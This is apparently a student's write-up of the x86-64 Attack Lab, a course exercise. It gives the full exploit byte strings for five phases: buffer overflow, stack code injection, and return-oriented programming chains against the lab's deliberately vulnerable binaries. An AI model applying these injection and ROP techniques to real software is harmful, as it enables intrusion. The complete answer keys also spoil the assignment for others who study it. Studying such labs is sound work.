# Attack Lab
This is an x86-64 attack lab for self-study students.

I also document what I had to do to solve this lab.

## Tools
- GDB
- objdump
- GCC

## Phase 1
This is a simple buffer overflow exploit. You can see the dump of the ctarget binary [here](./dump_ctarget.txt). We need to exploit the vulnerability in [getbuf](./dump_ctarget.txt#L777). The first instruction is the key here. `sub $0x28,%rsp` means we will need to provide 40 bytes before we can modify the return address located in the stack. In the 40th byte, we will give the address of the function [touch1](./dump_ctarget.txt#L787) in little endian format (`c0 17 40 00 00 00 00 00`). Hence, we get the following answer:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

## Phase 2
Similar to phase 1 except we need to add the instruction to store our cookie in register `%rdi`. We need to execute few instructions before we transfer control to touch2. For this, we will need the 40-47 bytes to contain the address pointing back into the stack that stores the *buffer* (0-39 bytes from getbuf). The buffer will be modified in such a way that it will update the value of register `%rdi` (the first argument to the function), and then hand over the control to touch2. To get to the function touch2, we will use the `retq` instruction. Recall that `retq` pops the value from the stack and into the register `%rip` (register which holds the memory address to the next instruction to execute). This means we will have to push the address of touch2 into our stack. This push will modify the return address located in our stack (bytes 40-47), which will allow our exploit to safely transfer the control. The instructions we will execute will look like this:
```asm
0:	68 ec 17 40 00       	pushq  $0x4017ec           /* Push address of touch2 to stack  */
5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi    /* Move cookie to register %rdi */
c:	c3                   	retq   
d:	90                   	nop
e:	90                   	nop
f:	90                   	nop
```

Our answer will then, look like this:
```
68 ec 17 40 00 48 c7 c7
fa 97 b9 59 c3 90 90 90
ec 17 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

## Phase 3
This one is also pretty simple. We need to call touch3 and store the address of our cookie string in register `%rdi`. The challenge we face are the various instructions that will overwrite our stack. Hence, we need to store the string representation of our cookie on an address which will not get overwritten, which is exactly before the stack address storing the address of touch3. Notice how the `pushq` instruction we use in our execution code pushes data on address `0x5561dca0`. This means, all the future pushes to the stack will be on addresses starting from `0x5561dca0` and onwards. Therefore, we will store our string in the stack on address `0x5561dca8`. Our execution code will look like this:
```asm
0:	68 fa 18 40 00       	pushq  $0x4018fa
5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
c:	c3                   	retq
```

Solution:
```
68 fa 18 40 00 48 c7 c7
a8 dc 61 55 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 /* String representation of our cookie */
```

## Phase 4
This is a very easy phase. We just need to find byte sequences in the gadget farm provided to us. We may not be able to make the target execute our code, but we can still modify the stack and add our data to it. Firstly, we will still overflow our buffer of 40 bytes, and overwrite the return address. Secondly, we need to fill our stack with addresses and data that will make the program execute the exploit similar to phase 2. The hints and constraints in the lab's reading helped me narrow down on what byte sequences I am looking for.

The `popq` instruction is very useful to us here. It will pop the value from the stack and into the register of our choosing. This means, we can store our cookie in the stack and pop it to a register.

(Note that the text for phase 4 below are made with reference to the [disassembly of rtarget binary file](./dump_rtarget.txt))

I wasn't able to find the byte `5f` (pop stack data to register `%rdi`) in the gadget farm, so I settled with the byte `58` (pop stack data to register `%rax`). Luckily, I was able to find the byte sequence for the instruction `movq %rax,%rdi` in the gadget farm. Otherwise, I would have had to look for an alternative to `58`.

With this information, we can create our solution string:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction popq %rax */
fa 97 b9 59 00 00 00 00 /* Our cookie */
c5 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rax,%rdi */
ec 17 40 00 00 00 00 00 /* Address of touch2 */
```

## Phase 5
Pretty simple but long phase. We are again going to overflow our buffer using 40 bytes of useless data. After that, we only need to find the bytes sequences of the instructions we need.

We will again store the string representation of our cookie at the stack address just before the address storing the pointer to touch3 (Remember, everything after that is going to be overwritten). Now the challenge is how to get this address and store it in register `%rdi`. We also cannot determine what the stack position is going to be when the program is run, due to randomization.

The key here is the function `add_xy` in the gadget farm. This function adds the two arguments passed to it and returns the value. The two arguments are represented by the registers `%rdi` (first argument) and `%rsi` (second argument). The register `%rax` will be populated with the result of the addition. This means, we will need to store the value of `%rsp` in one of the two argument registers and the value we need to add (to get the stack address where our string cookie is stored) on the other. We will then move the result into `%rdi`. We will also store our adding value in the stack and pop it into a register.

I was going through the byte sequences in the gadge farm and came to the conclusion that we are going to need 8 gadgets to complete this (as the hint in the reading suggested). There is no direct way of moving the value of `%rsp` to either `%rdi` or `%rsi`, nor is there a byte sequence to pop our value from the stack to `%rdi` or `%rsi`.
The only pop instruction I could find was `popq %rax`, hence, I will use this. Upon inspection, we also won't be able to find the instruction `movq %rax,%rsi`, but we do have `movq %rax,%rdi`. However, we can find a long way of moving the value from `%eax` to `%esi`, using the following sequences of instructions:
```
89 c2 /* movl %eax,%edx */
89 d1 /* movl %edx,%ecx */
89 ce /* movl %ecx,%eci */
```
Since these are instructions on the lower 4 bytes, these will result in the upper 4 bytes of a register to be zeroed. Therefore, we can only store our adding value to `%rsi`.

We will use the following sequences of instructions to move `%rsp` to `%rdi`:
```
48 89 e0 /* movq %rsp,%rax */
48 89 c7 /* movq %rax,%rdi */
```

To calculate the value we are going to add to `%rsp`, to get the address pointing to our string cookie, we will look at where our address to the instruction `movq %rsp,%rax` is located in the stack. For my solution, it was located 32 (0x20) bytes away. Hence, the solution:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction popq %rax */
20 00 00 00 00 00 00 00 /* Hex number 0x20 */
dd 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movl %eax,%edx */
34 1a 40 00 00 00 00 00 /* Address of byte sequence for the instruction movl %edx,%ecx */
13 1a 40 00 00 00 00 00 /* Address of byte sequence for the instruction movl %ecx,%esi */
06 1a 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rsp,%rax */
c5 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rax,%rdi */
d6 19 40 00 00 00 00 00 /* Address of add_xy */
c5 19 40 00 00 00 00 00 /* Address of byte sequence for the instruction movq %rax,%rdi */
fa 18 40 00 00 00 00 00 /* Address of touch3 */
35 39 62 39 39 37 66 61 /* String representation of our cookie */
```
